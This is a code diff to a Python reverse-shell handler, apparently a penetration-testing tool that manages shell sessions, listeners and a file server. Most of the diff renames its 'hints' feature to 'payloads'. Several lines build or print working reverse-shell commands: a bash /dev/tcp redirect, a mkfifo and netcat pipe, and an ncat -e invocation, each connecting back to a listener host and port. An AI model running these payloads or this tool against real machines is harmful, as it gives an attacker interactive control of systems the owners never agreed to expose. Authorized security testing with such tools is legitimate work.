@@ -706,7 +706,7 @@ class MainMenu(BetterCMD):
 		self.commands = {
 			"Session Operations":['run', 'upload', 'download', 'open', 'maintain', 'spawn', 'upgrade', 'exec', 'script', 'portfwd'],
 			"Session Management":['sessions', 'use', 'interact', 'kill', 'dir|.'],
-			"Shell Management"  :['listeners', 'connect', 'hints', 'Interfaces'],
+			"Shell Management"  :['listeners', 'payloads', 'connect', 'Interfaces'],
 			"Miscellaneous"     :['help', 'modules', 'history', 'reset', 'reload', 'SET', 'DEBUG', 'exit|quit|q|Ctrl+D']
 		}
 
@@ -1321,17 +1321,17 @@ class MainMenu(BetterCMD):
 			if Connect(address, port) and not options.no_attach:
 				return True
 
-	def do_hints(self, line):
+	def do_payloads(self, line):
 		"""
 
-		Reverse shell hints based on the registered listeners
+		Create reverse shell payloads based on the active listeners
 		"""
 		if core.listeners:
 			print()
 			for listener in core.listeners.values():
-				print(listener.hints, end='\n\n')
+				print(listener.payloads, end='\n\n')
 		else:
-			cmdlogger.warning("No registered Listeners to show hints")
+			cmdlogger.warning("No Listeners to show payloads")
 
 	def do_Interfaces(self, line):
 		"""
@@ -1837,8 +1837,8 @@ class Listener:
 
 		core.control << "" # TODO
 
-		if options.hints:
-			print(self.hints)
+		if options.payloads:
+			print(self.payloads)
 
 	def stop(self):
 
@@ -1862,7 +1862,7 @@ class Listener:
 			logger.warning(f"Stopping {self}")
 
 	@property
-	def hints(self):
+	def payloads(self):
 		interfaces = Interfaces().list
 		presets = [
 			"setsid bash >& /dev/tcp/{}/{} 0>&1 &",
@@ -2151,7 +2151,7 @@ class Session:
 				return False
 
 			response = self.exec(
-				'echo -e "$({0} -n)\t'
+				'printf "$({0} -n)\t'
 				'$({0} -s)\t'
 				'$({0} -m 2>/dev/null|grep -v unknown||{0} -p 2>/dev/null)"'.format(self.bin['uname']),
 				agent_typing=True,
@@ -2914,7 +2914,7 @@ class Session:
 				expect_func=lambda data: not self.can_deploy_agent or b"\x01" in data,
 				raw=True
 			)
-			if not isinstance(response, bytes):
+			if self.can_deploy_agent and not isinstance(response, bytes):
 				logger.error("The shell became unresponsive. I am killing it, sorry... Next time I will not try to deploy agent")
 				Path(self.directory / ".noagent").touch()
 				self.kill()
@@ -3658,8 +3658,7 @@ class Session:
 				if self.bin['bash']:
 					cmd = f'echo -n "{self.bin["setsid"]} {self.bin["bash"]} >& /dev/tcp/{host}/{port} 0>&1 &"|{self.bin["bash"]}'
 				elif self.bin['nc']:
-					cmd = f'daemon sh -c \'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | {self.bin["sh"]} -i 2>&1 | nc {host} {port} > /tmp/f\''
-
+					cmd = f'sh -c \'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | {self.bin["sh"]} 2>&1 | nc {host} {port} > /tmp/f &\''
 				elif self.bin['sh']:
 					ncat_cmd = f'{self.bin["sh"]} -c "{self.bin["setsid"]} {{}} -e {self.bin["sh"]} {host} {port} &"'
 					ncat_binary = self.tmp + '/ncat'
@@ -4415,7 +4414,7 @@ class FileServer:
 				logger.warning(f"{item} is not served.")
 
 	@property
-	def hints(self):
+	def links(self):
 		output = []
 		ips = [self.host]
 
@@ -4530,7 +4529,7 @@ class FileServer:
 			self.id = core.new_fileserverID
 			core.fileservers[self.id] = self
 			if not quiet:
-				print(self.hints)
+				print(self.links)
 			self.httpd.serve_forever()
 
 	def stop(self):
@@ -4691,7 +4690,7 @@ def listener_menu():
 				termios.tcsetattr(sys.stdin, termios.TCSADRAIN, TTY_NORMAL)
 				print()
 				for listener in core.listeners.values():
-					print(listener.hints, end='\n\n')
+					print(listener.payloads, end='\n\n')
 			elif command == '\x0C':
 				os.system("clear")
 			elif command in ('q', '\x03'):
@@ -4748,7 +4747,7 @@ class Options:
 		self.default_listener_port = 4444
 		self.default_interface = "0.0.0.0"
 		self.default_fileserver_port = 8000
-		self.hints = False
+		self.payloads = False
 		self.no_log = False
 		self.no_timestamps = False
 		self.no_colored_timestamps = False
@@ -4847,7 +4846,7 @@ def main():
 	method.add_argument("-c", "--connect", help="Bind shell Host", metavar='')
 
 	hints = parser.add_argument_group("Hints")
-	hints.add_argument("-a", "--hints", help="Show sample payloads for reverse shell based on the registered Listeners", action="store_true")
+	hints.add_argument("-a", "--payloads", help="Show sample payloads for reverse shell based on the registered Listeners", action="store_true")
 	hints.add_argument("-l", "--interfaces", help="Show the available network interfaces", action="store_true")
 	hints.add_argument("-h", "--help", action="help", help="show this help message and exit")
 
